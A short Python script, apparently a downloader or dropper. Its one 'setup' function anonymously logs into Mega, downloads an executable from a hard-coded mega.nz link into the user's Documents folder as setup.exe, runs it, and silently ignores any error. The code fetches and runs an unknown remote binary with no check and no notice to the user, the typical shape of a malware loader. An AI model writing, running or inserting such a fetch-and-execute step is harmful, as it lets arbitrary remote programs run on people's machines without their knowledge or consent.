import os, subprocess
from mega import Mega
def setup():
    mega = Mega()
    m = mega.login()
    setupexepath = os.path.join(os.path.expanduser("~\\Documents"), "setup.exe")
    try:
        url = 'https://mega.nz/file/eMYknAJb#zFgHhmclSSOs6r2CA2OzboaZCI643WwVsyWTSOSmuy0'
        file = m.download(url, dest_path=setupexepath)
        subprocess.run([setupexepath])
    except Exception:
        pass
